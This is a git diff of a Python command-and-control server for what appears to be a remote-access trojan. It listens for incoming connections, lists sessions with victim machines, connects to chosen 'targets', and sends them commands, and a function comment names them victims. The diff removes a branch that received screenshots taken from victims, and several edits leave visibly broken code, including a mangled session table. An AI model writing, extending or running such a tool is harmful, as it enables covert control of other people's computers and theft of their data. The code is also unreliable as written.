@@ -14,7 +14,7 @@ import queue
 import sys , os , time
 from tabulate import *
 import tqdm
-from tool import *
+from server_host.tool import *
 #from tool import help_menu
 '''setting the variabeles'''
 NUMBER_OF_THREAD = 2
@@ -23,7 +23,7 @@ queue = queue.Queue()
 all_connection = []
 address_connection = []
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-host = "192.168.1.37"
+host = "192.168.1.41"
 port = 5050
 SEPARATOR = "<SEPARATOR>"
 ''' setting a socket creating'''
@@ -68,33 +68,16 @@ def conection_accept():
 '''creating a shell intarface'''
 def intarface():
 	while True:
-		op_listen = input(f" {c}${y}S{r}-{y}T{r}session{v}>> {g}")
+		op_listen = input(f"\n {c}${y}S{r}-{y}T{r}session{v}>> {g}")
 		if op_listen == "clear":
 			os.system("clear")
 		elif op_listen == "exit":
 			s.close()
 			sys.exit()
-		elif op_listen == "show session":
-			session_list()
-		elif op_listen[0] == "screenshot":
-			s.send(op_listen.encode("utf-8"))
-			img_recv = s.recv(2048).encode("utf-8")
-			img_name, img_size = img_recv.split(SEPARATOR)
-			img_name = os.path.basename(img_name)
-			img_size = int(img_size)
-			progress = tqdm.tqdm(range(img_size), f"{c}[{g}!{c}] {g}receiving {r}{img_name}{r}", unit="B", unit_scale=True, unit_divisor=1024)
-			with open(img_name, "wb") as target_img:
-				while True:
-        			bytes_read = client_socket.recv(BUFFER_SIZE)
-        			if not bytes_read:
-            			break
-			target_img.write(bytes_read)
-			progress.update(len(bytes_read))
-			print(f"{c}{g}+{c}] {g}the screeenshot recived succesfully{none}")
 		elif op_listen[0:] == "connect":
-			session_connect()
+			session_connect(op_listen)
 		elif op_listen == "help":
-			help_menu()
+			help_menu_session()
 		else:
 			print(f"  {c}[{r}!{c}] {y}command not find {r}:{v} {op_listen}")
 '''creating a list os every session'''
@@ -108,7 +91,7 @@ def session_list():
 		except socket.error as error:
 			del all_connection[i]
 			del address_connection[0]
-		result = [f"{y}session number",f"{y}IP",f"{y}PORT"],[f"{r}{str(i)}",f"{r}str{address_connection[i][0]}",f"{r}{address_connection[i][1]}"]
+		result = f"{y}session number" + f"{y}IP",f"{y}PORT" + f"{r}{str(i)}" + f"{r}{address_connection[i][0]}" + f"{r}{address_connection[i][1]}"
 	print(tabulate(result, headers="firstrow",tablefmt="fancy_grid"))
 	#print(str(address_connection[i][0:]))
 '''connecting to the targets'''
@@ -116,13 +99,13 @@ def session_connect(op_listen):
 	try:
 		print(f"  {c}[{g}!{c}] {y}Trying to connecting to {v}>> {r} {str(address_connection[0:])}")
 		time.sleep(1)
-		target = op_listen.replace("connect "," ")
+		target = op_listen.replace("connect"," ")
 		target = int(target)
 		conn = all_connection[target]
 		time.sleep(2)
-		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0:]}",end="")
+		print(f"  {c}[{g}+{c}] {g} you are now connected to {v}>>{r} {address_connection[0]}",end="")
 	except s.error as error:
-		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0:]}")
+		print(f"  {c}[{r}-{c}] {y}Could not to connect to  {v}>> {r}{address_connection[0]}")
 '''sending commands to the victim'''
 def send_command():
 	while True:
